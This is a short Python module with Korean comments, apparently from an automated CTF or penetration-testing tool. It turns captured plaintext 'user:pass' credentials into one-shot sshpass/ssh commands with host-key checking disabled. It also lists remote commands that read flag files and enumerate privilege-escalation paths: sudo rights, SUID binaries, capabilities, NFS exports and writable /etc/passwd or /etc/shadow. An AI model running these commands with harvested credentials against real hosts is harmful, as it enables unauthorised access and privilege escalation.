"""SSH 발판 실행 채널 — exploit-exec(옵트인) 전용. 확보한 평문 자격으로 타겟에서
한 줄 명령을 실행한다(대화형 아님, 기존 one-shot 러너 모델 그대로)."""
from __future__ import annotations

import shlex
from dataclasses import dataclass


def parse_cred(cred: str):
    """'user:pass' → (user, pass). 해시(<...>)·빈 값은 None(평문만)."""
    if not cred or ":" not in cred:
        return None
    user, pw = cred.split(":", 1)
    user, pw = user.strip(), pw.strip()
    if not user or not pw or pw.startswith("<"):
        return None
    return user, pw


@dataclass
class SSHTargetShell:
    target: str
    user: str
    password: str = ""
    port: int = 22

    def command(self, remote_cmd: str) -> str:
        """원격 한 줄 명령을 sshpass+ssh one-shot 명령 문자열로 감싼다(러너가 실행)."""
        return (f"sshpass -p {shlex.quote(self.password)} "
                f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 "
                f"-o PreferredAuthentications=password -o PubkeyAuthentication=no "
                f"-p {int(self.port)} {shlex.quote(self.user + '@' + self.target)} "
                f"{shlex.quote(remote_cmd)}")


# user/root 는 '분리된 명령'으로 읽어야 provenance 가 kind 를 정확히 분류한다.
FLAG_READS = [
    "cat /home/*/user.txt 2>/dev/null; cat ~/user.txt 2>/dev/null",   # → user
    "cat /root/root.txt 2>/dev/null",                                 # → root
]
PRIVESC_ENUM = [   # 권한상승 '열거'만(파괴 없음) — 다음 수 판단 재료
    "id; whoami; sudo -n -l 2>/dev/null; sudo -l 2>/dev/null",
    "find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null",
    # 비-GTFOBins 표준 벡터 신호(NFS·writable passwd) — analyze_extra 가 파싱
    "cat /etc/exports 2>/dev/null; ls -la /etc/passwd 2>/dev/null; "
    "find / -writable -type f 2>/dev/null | grep -E '/etc/(passwd|shadow)$'",
]
